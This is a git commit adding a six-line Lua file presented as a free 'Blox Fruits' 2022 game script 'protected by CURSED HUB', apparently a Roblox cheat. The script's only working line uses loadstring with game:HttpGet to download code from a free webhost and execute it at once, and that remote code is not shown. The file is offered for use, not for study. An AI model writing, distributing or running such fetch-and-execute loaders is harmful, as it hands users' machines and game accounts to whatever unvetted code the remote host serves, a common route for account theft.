aeb986ec7b631b4f3ebf1eb9a200db98c949d4f3
xNiKlaSTHx <88712393+xNiKlaSTHx@users.noreply.github.com>
2022-01-02 05:08:52 -0500

    Create FREEBLOXFRUITS2022BIGUPDATE.lua

---
+++ FREEBLOXFRUITS2022BIGUPDATE.lua
@@ -0,0 +1,6 @@
+# # # FREE SCRIPT # # #
+--- Protect By CURSED HUB ---
+
+loadstring(game:HttpGet("https://og-edition.000webhostapp.com/load-welcome-antiFREE_2022.lua"))()
+
+-----------------------------
